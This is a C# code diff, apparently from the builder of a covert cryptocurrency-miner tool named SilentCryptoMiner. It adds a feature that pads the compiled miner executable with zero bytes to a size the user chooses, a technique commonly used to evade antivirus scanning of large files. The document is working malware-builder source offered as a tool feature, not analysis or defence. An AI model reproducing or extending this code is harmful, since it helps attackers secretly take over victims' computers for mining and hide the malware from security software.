@@ -322,6 +322,8 @@ namespace SilentCryptoMiner
                     BuildLog("Compiling Miner Checker...");
                     Codedom.CheckerCompiler(savePathBase + "-checker.exe");
 
+                    IncreaseExeFile(savePathBase);
+
                     BuildLog("Done!");
                     btnBuild.Invoke(new Action(() => btnBuild.Text = "Build"));
                     btnBuild.Invoke(new Action(() => btnBuild.Enabled = true));
@@ -336,6 +338,31 @@ namespace SilentCryptoMiner
             {
                 BuildError("Error: An error occured while building the file: " + ex.Message);
                 return;
+            }
+        }
+
+        private void IncreaseExeFile(string savePathBase)
+        {
+            double exeSize = 0;
+
+            if (!string.IsNullOrWhiteSpace(txtExeSize.Text) && double.TryParse(txtExeSize.Text, out exeSize) && exeSize > 0)
+            {
+
+                BuildLog("Increasing executable size...");
+
+                exeSize *= 1048576;
+
+                File.Copy(string.Format("{0}.exe", savePathBase), string.Format("{0}-increased.exe", savePathBase));
+
+                using (FileStream fileStream = File.OpenWrite(string.Format("{0}-increased.exe", savePathBase)))
+                {
+                    long fsSeek = fileStream.Seek(0L, SeekOrigin.End);
+                    while (fsSeek < exeSize)
+                    {
+                        fileStream.WriteByte(0);
+                        fsSeek += 1L;
+                    }
+                }
             }
         }
 
